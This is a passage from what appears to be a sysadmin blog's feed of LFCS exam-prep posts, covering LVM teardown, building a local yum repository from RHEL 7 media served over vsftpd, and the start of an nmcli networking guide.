</span><span class='line'>umount: /mnt/inventory (/dev/mapper/vg--zero-inventory) unmounted</span></code></pre></td></tr></table></div></figure>


<p>Remove the LV:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvremove /dev/vg-zero/inventory 
</span><span class='line'>Do you really want to remove active logical volume vg-zero/inventory? [y/n]: y
</span><span class='line'>  Logical volume "inventory" successfully removed</span></code></pre></td></tr></table></div></figure>


<p>Remove the VG:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgremove vg-zero 
</span><span class='line'>  Volume group "vg-zero" successfully removed</span></code></pre></td></tr></table></div></figure>


<p>Finally, also remove the PVs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvremove /dev/sdb1 /dev/sdb2
</span><span class='line'>  Labels on physical volume "/dev/sdb1" successfully wiped.
</span><span class='line'>  Labels on physical volume "/dev/sdb2" successfully wiped.</span></code></pre></td></tr></table></div></figure>


<p>And don&rsquo;t forget to delete any remaining fstab entries.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>/ That secret you've been guarding, \
</span><span class='line'>\ isn't.                            /
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Creating custom yum repositories]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/17/lfcs-prep-creating-custom-yum-repositories/"/>
    <updated>2018-01-17T13:21:03-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/17/lfcs-prep-creating-custom-yum-repositories</id>
    <content type="html"><![CDATA[<p>Setting up a local package repository is useful when you need to save bandwidth or you won&rsquo;t have access to internet. In this post we&rsquo;ll set up a local yum repository from the DVD source, install vsftpd from it, and then host the repository over FTP.</p>

<!-- more -->


<h2>Making a local repository from DVD</h2>

<p>I made a <strong>/mnt/cdrom</strong> directory where I can mount the DVD. Then check what you have in the drive:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>blkid /dev/sr0
</span><span class='line'>/dev/sr0: UUID="2016-10-19-18-32-06-00" LABEL="RHEL-7.3 Server.x86_64" TYPE="iso9660" PTTYPE="dos"</span></code></pre></td></tr></table></div></figure>


<p>Mount the ISO:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t iso9660 -o ro /dev/sr0 /mnt/cdrom</span></code></pre></td></tr></table></div></figure>


<p>Copy the packages on the DVD to a directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir -p /mnt/repos
</span><span class='line'>cp -rpv /mnt/cdrom/Packages/ /mnt/repos/rhel7</span></code></pre></td></tr></table></div></figure>


<p>Grab a cofee, this will take a while. When it&rsquo;s finished, create the repo from all the RPMS you copied:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>createrepo /mnt/repos/rhel7
</span><span class='line'>Spawning worker 0 with 4751 pkgs
</span><span class='line'>Workers Finished
</span><span class='line'>Saving Primary metadata
</span><span class='line'>Saving file lists metadata
</span><span class='line'>Saving other metadata
</span><span class='line'>Generating sqlite DBs
</span><span class='line'>Sqlite DBs complete</span></code></pre></td></tr></table></div></figure>


<p>Next, we need to create a conf file for the repo. These files should be placed in <code>/etc/yum.repos.d</code> and be of the format <em>name.repo</em>. For a listing of the repository options that you can set, see the <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/sec-configuring_yum_and_yum_repositories#sec-Setting_repository_Options">RedHat documentation</a></p>

<p>I defined a repo file that looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/yum.repos.d/rhel7-local.repo 
</span><span class='line'>[rhel7-local]
</span><span class='line'>name=Local RHEL7 repository
</span><span class='line'>baseurl=file:///mnt/repos/rhel7
</span><span class='line'>enabled=1
</span><span class='line'>gpgcheck=0</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>[name] &ndash; this is a unique repository ID, and it should contain no spaces</p></li>
<li><p>name &ndash; a description of the repository</p></li>
<li><p>baseurl &ndash; location of the repository data. For local files: <code>file:///path/to/local/repo</code>. For <a href="HTTP:">HTTP:</a> <code><a href="http://path/to/repo">http://path/to/repo</a></code>. And for <a href="FTP:">FTP:</a> <code><a href="ftp://path/to/repo">ftp://path/to/repo</a></code></p></li>
<li><p>enabled &ndash; this 0 or 1 value specifies whether the repository is used by yum or not</p></li>
<li><p>gpgcheck &ndash; this 0 or 1 value specifies if yum will do a GPG signature check on the packages</p></li>
</ul>


<p>I cleared the yum cache and checked that my repo has been enabled:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum clean all
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>Cleaning repos: rhel-7-server-rpms rhel-7-server-rt-beta-rpms rhel-7-server-rt-rpms rhel7-local
</span><span class='line'>Cleaning up everything
</span><span class='line'>yum repolist enabled | grep rhel7-local
</span><span class='line'>rhel7-local                          Local RHEL7 repository               4,751</span></code></pre></td></tr></table></div></figure>


<h2>Install vsftpd from local repo</h2>

<p>I disabled the other repositories and installed vsftpd from my local one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y vsftpd
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>Resolving Dependencies
</span><span class='line'>--&gt; Running transaction check
</span><span class='line'>---&gt; Package vsftpd.x86_64 0:3.0.2-21.el7 will be installed
</span><span class='line'>--&gt; Finished Dependency Resolution
</span><span class='line'>
</span><span class='line'>Dependencies Resolved
</span><span class='line'>
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'> Package                               Arch                                  Version                                        Repository                                  Size
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'>Installing:
</span><span class='line'> vsftpd                                x86_64                                3.0.2-21.el7                                   rhel7-local                                169 k
</span><span class='line'>
</span><span class='line'>Transaction Summary
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'>Install  1 Package
</span><span class='line'>
</span><span class='line'>Total download size: 169 k
</span><span class='line'>Installed size: 348 k
</span><span class='line'>Downloading packages:
</span><span class='line'>Running transaction check
</span><span class='line'>Running transaction test
</span><span class='line'>Transaction test succeeded
</span><span class='line'>Running transaction
</span><span class='line'>  Installing : vsftpd-3.0.2-21.el7.x86_64                                                                                                                                1/1 
</span><span class='line'>  Verifying  : vsftpd-3.0.2-21.el7.x86_64                                                                                                                                1/1 
</span><span class='line'>
</span><span class='line'>Installed:
</span><span class='line'>  vsftpd.x86_64 0:3.0.2-21.el7                                                                                                                                               
</span><span class='line'>
</span><span class='line'>Complete!</span></code></pre></td></tr></table></div></figure>


<p>Start the FTP service and see that it&rsquo;s running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start vsftpd && systemctl status vsftpd
</span><span class='line'> vsftpd.service - Vsftpd ftp daemon
</span><span class='line'>   Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; disabled; vendor preset: disabled)
</span><span class='line'>   Active: active (running) since Mon 2018-01-15 15:21:54 EET; 35ms ago
</span><span class='line'>  Process: 6025 ExecStart=/usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf (code=exited, status=0/SUCCESS)
</span><span class='line'> Main PID: 6026 (vsftpd)
</span><span class='line'>   CGroup: /system.slice/vsftpd.service
</span><span class='line'>           6026 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
</span><span class='line'>
</span><span class='line'>Jan 15 15:21:54 rhel7 systemd[1]: Starting Vsftpd ftp daemon...
</span><span class='line'>Jan 15 15:21:54 rhel7 systemd[1]: Started Vsftpd ftp daemon.</span></code></pre></td></tr></table></div></figure>


<p>If you have firewalld running, you have to allow vsftpd. First, chech the default zone:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-default-zone
</span><span class='line'>public</span></code></pre></td></tr></table></div></figure>


<p>Check if FTP is allowed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --query-service=ftp
</span><span class='line'>no</span></code></pre></td></tr></table></div></figure>


<p>Add a rule to allow <a href="FTP:">FTP:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=public --add-service=ftp --permanent
</span><span class='line'>success</span></code></pre></td></tr></table></div></figure>


<p>Restart the firewall and check again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --query-service=ftp
</span><span class='line'>yes</span></code></pre></td></tr></table></div></figure>


<p>Next, I copied the repository to the FTP folder in <code>/var/ftp/pub</code> and changed the ownership to <a href="ftp:">ftp:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp -r /mnt/repos/rhel7/ /var/ftp/pub/rhel7
</span><span class='line'>chown -R ftp:ftp /var/ftp/pub/rhel7/</span></code></pre></td></tr></table></div></figure>


<p>Check the SELinux context:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lZ /var/ftp/pub/
</span><span class='line'>dr-xr-xr-x. ftp ftp unconfined_u:object_r:public_content_t:s0 rhel7</span></code></pre></td></tr></table></div></figure>


<p>And to see if everything works, FTP anonymously to the server and list the files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp localhost
</span><span class='line'>Trying ::1...
</span><span class='line'>Connected to localhost (::1).
</span><span class='line'>220 (vsFTPd 3.0.2)
</span><span class='line'>Name (localhost:root): anonymous
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; ls
</span><span class='line'>229 Entering Extended Passive Mode (|||43989|).
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>drwxr-xr-x    3 0        0              19 Jan 15 13:47 pub
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp&gt; ls pub
</span><span class='line'>229 Entering Extended Passive Mode (|||35006|).
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>dr-xr-xr-x    3 14       50         258048 Jan 15 13:49 rhel7</span></code></pre></td></tr></table></div></figure>


<p>Now you can create another repo file like before, but this time served over <a href="FTP:">FTP:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/yum.repos.d/ftp-rhel7.repo 
</span><span class='line'>[ftp-rhel7]
</span><span class='line'>name=RHEL7 repository FTP
</span><span class='line'>baseurl=ftp://127.0.0.1/pub/rhel7
</span><span class='line'>enabled=1
</span><span class='line'>gpgcheck=0</span></code></pre></td></tr></table></div></figure>


<p>I disabled the local repository and only kept the FTP one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum repolist
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>ftp-rhel7                                                                                                                | 2.9 kB  00:00:00     
</span><span class='line'>ftp-rhel7/primary_db                                                                                                     | 3.8 MB  00:00:00     
</span><span class='line'>repo id                                                        repo name                                                                  status
</span><span class='line'>ftp-rhel7                                                      RHEL7 repository FTP                                                       4,751
</span><span class='line'>repolist: 4,751</span></code></pre></td></tr></table></div></figure>


<p>Install something to see it work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y squid
</span><span class='line'>[...]
</span><span class='line'>Installed:
</span><span class='line'>  squid.x86_64 7:3.5.20-2.el7                                                                                                                   
</span><span class='line'>
</span><span class='line'>Dependency Installed:
</span><span class='line'>  libecap.x86_64 0:1.0.0-1.el7                          perl-Digest.noarch 0:1.17-245.el7          perl-Digest-MD5.x86_64 0:2.52-3.el7         
</span><span class='line'>  squid-migration-script.x86_64 7:3.5.20-2.el7         
</span><span class='line'>
</span><span class='line'>Complete!</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Don't get stuck in a closet -- wear \
</span><span class='line'>\ yourself out.                       /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - NetworkManager configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/11/lfcs-prep-networkmanager-configuration/"/>
    <updated>2018-01-11T13:31:50-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/11/lfcs-prep-networkmanager-configuration</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look over configuring various network settings with <strong>nmcli</strong>, the command line tool for NetworkManager.</p>

<!-- more -->


<p>The first step is to understand how network configuration settings look. Inside the <code>/etc/sysconfig/network-scripts/</code> directory, you can find config files for your network interfaces, under the format of <strong>ifcfg-name</strong>. On my system, it looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat ifcfg-Wired_connection_1 
</span><span class='line'>HWADDR=00:0C:29:47:D7:A8
</span><span class='line'>TYPE=Ethernet
</span><span class='line'>BOOTPROTO=dhcp
</span><span class='line'>DEFROUTE=yes
</span><span class='line'>IPV4_FAILURE_FATAL=no
</span><span class='line'>IPV6INIT=yes
</span><span class='line'>IPV6_AUTOCONF=yes
</span><span class='line'>IPV6_DEFROUTE=yes
</span><span class='line'>IPV6_FAILURE_FATAL=no
</span><span class='line'>IPV6_ADDR_GEN_MODE=stable-privacy
</span><span class='line'>NAME="Wired connection 1"
</span><span class='line'>UUID=8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>ONBOOT=yes
</span><span class='line'>DNS1=8.8.8.8
</span><span class='line'>PEERDNS=yes
</span><span class='line'>PEERROUTES=yes
</span><span class='line'>IPV6_PEERDNS=yes
</span><span class='line'>IPV6_PEERROUTES=yes</span></code></pre></td></tr></table></div></figure>


<p>You can find a more complete overview of the options at <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-networkscripts-interfaces.html">https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-networkscripts-interfaces.html</a> , but from a glance at this file, we see the interface is an Ethernet device, it uses DHCP, it&rsquo;s set as the default route for both IPv4 and IPv6 traffic, it&rsquo;s activated at boot time, and also some other details like its MAC address and name.</p>

<p>nmcli is a very powerful tool, and you can press Tab to see options for its use at every stage.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli help
</span><span class='line'>Usage: nmcli [OPTIONS] OBJECT { COMMAND | help }
</span><span class='line'>
</span><span class='line'>OPTIONS
</span><span class='line'>  -t[erse]                                   terse output
</span><span class='line'>  -p[retty]                                  pretty output
</span><span class='line'>  -m[ode] tabular|multiline                  output mode
</span><span class='line'>  -c[olors] auto|yes|no                      whether to use colors in output
</span><span class='line'>  -f[ields] &lt;field1,field2,...&gt;|all|common   specify fields to output
</span><span class='line'>  -e[scape] yes|no                           escape columns separators in values
</span><span class='line'>  -a[sk]                                     ask for missing parameters
</span><span class='line'>  -s[how-secrets]                            allow displaying passwords
</span><span class='line'>  -w[ait] &lt;seconds&gt;                          set timeout waiting for finishing operations
</span><span class='line'>  -v[ersion]                                 show program version
</span><span class='line'>  -h[elp]                                    print this help
</span><span class='line'>
</span><span class='line'>OBJECT
</span><span class='line'>  g[eneral]       NetworkManager's general status and operations
</span><span class='line'>  n[etworking]    overall networking control
</span><span class='line'>  r[adio]         NetworkManager radio switches
</span><span class='line'>  c[onnection]    NetworkManager's connections
</span><span class='line'>  d[evice]        devices managed by NetworkManager
</span><span class='line'>  a[gent]         NetworkManager secret agent or polkit agent
</span><span class='line'>  m[onitor]       monitor NetworkManager changes</span></code></pre></td></tr></table></div></figure>


<p>Here we will go over a few examples:</p>

<h2>Device options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli device help
</span><span class='line'>Usage: nmcli device { COMMAND | help }
</span><span class='line'>
</span><span class='line'>COMMAND := { status | show | set | connect | reapply | modify | disconnect | delete | monitor | wifi | lldp }
</span><span class='line'>
</span><span class='line'>  status
</span><span class='line'>
</span><span class='line'>  show [&lt;ifname&gt;]
</span><span class='line'>
</span><span class='line'>  set [ifname] &lt;ifname&gt; [autoconnect yes|no] [managed yes|no]
</span><span class='line'>
</span><span class='line'>  connect &lt;ifname&gt;
</span><span class='line'>
</span><span class='line'>  reapply &lt;ifname&gt;
</span><span class='line'>
</span><span class='line'>  modify &lt;ifname&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>  disconnect &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  delete &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  monitor &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  wifi [list [ifname &lt;ifname&gt;] [bssid &lt;BSSID&gt;]]
</span><span class='line'>
</span><span class='line'>  wifi connect &lt;(B)SSID&gt; [password &lt;password&gt;] [wep-key-type key|phrase] [ifname &lt;ifname&gt;]
</span><span class='line'>                         [bssid &lt;BSSID&gt;] [name &lt;name&gt;] [private yes|no] [hidden yes|no]
</span><span class='line'>
</span><span class='line'>  wifi hotspot [ifname &lt;ifname&gt;] [con-name &lt;name&gt;] [ssid &lt;SSID&gt;] [band a|bg] [channel &lt;channel&gt;] [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>  wifi rescan [ifname &lt;ifname&gt;] [[ssid &lt;SSID to scan&gt;] ...]
</span><span class='line'>
</span><span class='line'>  lldp [list [ifname &lt;ifname&gt;]]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show device status</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli dev status
</span><span class='line'>DEVICE      TYPE      STATE      CONNECTION         
</span><span class='line'>virbr0      bridge    connected  virbr0             
</span><span class='line'>enp0s3      ethernet  connected  Wired connection 1 
</span><span class='line'>lo          loopback  unmanaged  --                 
</span><span class='line'>virbr0-nic  tun       unmanaged  --          </span></code></pre></td></tr></table></div></figure>


<ul>
<li>list device details</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli dev show enp0s3 
</span><span class='line'>GENERAL.DEVICE:                         enp0s3
</span><span class='line'>GENERAL.TYPE:                           ethernet
</span><span class='line'>GENERAL.HWADDR:                         00:0C:29:47:D7:A8
</span><span class='line'>GENERAL.MTU:                            1500
</span><span class='line'>GENERAL.STATE:                          100 (connected)
</span><span class='line'>GENERAL.CONNECTION:                     Wired connection 1
</span><span class='line'>GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveConnection/0
</span><span class='line'>WIRED-PROPERTIES.CARRIER:               on
</span><span class='line'>IP4.ADDRESS[1]:                         192.168.241.130/24
</span><span class='line'>IP4.GATEWAY:                            192.168.241.2
</span><span class='line'>IP4.DNS[1]:                             192.168.241.2
</span><span class='line'>IP4.DNS[2]:                             8.8.8.8
</span><span class='line'>IP4.DOMAIN[1]:                          localdomain
</span><span class='line'>IP6.ADDRESS[1]:                         fe80::d7e8:7b48:831f:a1de/64
</span><span class='line'>IP6.GATEWAY:                            </span></code></pre></td></tr></table></div></figure>


<h2>Connection options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con help
</span><span class='line'>Usage: nmcli connection { COMMAND | help }
</span><span class='line'>
</span><span class='line'>COMMAND := { show | up | down | add | modify | clone | edit | delete | monitor | reload | load | import | export }
</span><span class='line'>
</span><span class='line'>  show [--active] [--order &lt;order spec&gt;]
</span><span class='line'>  show [--active] [id | uuid | path | apath] &lt;ID&gt; ...
</span><span class='line'>
